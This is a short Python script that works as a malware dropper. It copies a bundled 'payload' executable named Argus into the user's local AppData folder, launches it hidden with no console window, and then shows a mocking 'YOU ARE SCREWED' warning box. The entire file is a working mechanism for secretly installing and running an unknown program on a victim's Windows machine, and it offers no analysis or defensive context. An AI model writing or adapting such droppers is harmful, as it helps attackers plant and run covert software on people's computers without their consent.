import os
import shutil
import subprocess
from pathlib import Path
import tkinter as tk
from tkinter import messagebox

def main():
    root = tk.Tk()
    root.withdraw()

    source_exe = Path(__file__).resolve().parent / "app" / "payload" / "Argus.exe"

    argus_dir = Path(os.environ["LOCALAPPDATA"]) / "Argus"
    argus_dir.mkdir(parents=True, exist_ok=True)

    destination_exe = argus_dir / "Argus"

    shutil.copy2(source_exe, destination_exe)

    subprocess.Popen([str(destination_exe)], creationflags=subprocess.CREATE_NO_WINDOW)

    print(f"Copied to: {destination_exe}")
    messagebox.showwarning("ZHASK", "YOU ARE SCREWED")

if __name__ == "__main__":
    main()